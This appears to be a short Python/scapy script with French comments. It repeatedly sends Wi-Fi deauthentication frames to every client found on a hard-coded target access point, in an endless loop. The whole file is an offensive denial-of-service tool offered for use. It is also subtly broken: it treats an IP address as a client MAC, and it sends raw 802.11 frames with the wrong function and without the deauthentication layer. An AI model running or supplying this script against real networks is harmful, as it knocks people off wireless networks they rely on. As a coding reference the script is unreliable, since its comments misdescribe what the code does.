from scapy.all import *
import os
import time

# Définition des variables
interface = "wlan1"  # interface réseau à utiliser
bssid = "08:36:C9:98:11:A9"  # adresse MAC de l'AP cible

# Fonction pour changer le canal
def set_channel(channel):
    os.system(f"iwconfig {interface} channel {channel}")

# Fonction pour envoyer des paquets de déconnexion
def deauth(client, bssid):
    packet = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
    send(packet, iface=interface, verbose=0)

# Changer le canal à 11 (ou tout autre canal de l'AP)
set_channel(11)

# Boucle pour déauthentifier tous les clients
while True:
    # Scanner pour les clients connectés
    clients = ARP(pdst=f"192.168.1.0/24")  # Remplacez par le bon sous-réseau
    ans, _ = sr(clients, timeout=2, verbose=0)

    for _, rcv in ans:
        client_mac = rcv.psrc  # adresse MAC du client
        print(f"Déauthentification de {client_mac}")
        deauth(client_mac, bssid)  # Envoi de paquets de déauthentification

    time.sleep(1)  # Attendre 1 seconde avant de renvoyer des paquets
